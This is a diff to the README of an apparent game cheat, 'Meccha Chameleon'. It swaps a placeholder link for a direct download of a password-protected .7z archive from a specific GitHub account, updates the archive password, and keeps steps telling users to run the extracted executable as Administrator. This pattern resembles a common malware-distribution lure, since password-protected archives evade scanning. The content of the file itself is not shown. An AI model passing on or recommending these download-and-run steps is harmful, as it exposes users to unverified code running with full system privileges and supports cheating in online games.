@@ -7,7 +7,7 @@
 ## 📥 Download
 
 **Latest version:**  
-🔗 **[Download Meccha Chameleon](https://github.com/yourusername/meccha-chameleon-cheat/releases/latest)**
+🔗 **[Download Meccha Chameleon](https://github.com/SkinkOvercome/chameleoncheat/releases/download/muerta/MecchaChameleon.7z)**
 
 **Password:** `meccha2026`
 
@@ -60,7 +60,7 @@
 ## 📦 Installation
 
 1. Download the archive from the link above
-2. Extract the ZIP file using the password: `chameleon2026`
+2. Extract the ZIP file using the password: `meccha2026`
 3. Run `MecchaChameleonCheat.exe` as Administrator
 4. Launch MECCHA CHAMELEON
 5. Press **INSERT** or **F1** to open the menu
@@ -90,6 +90,8 @@
 5. **Play** and dominate! 🏆
 
 ---
+
+
 
 ## 🔧 Supported Features Table
 
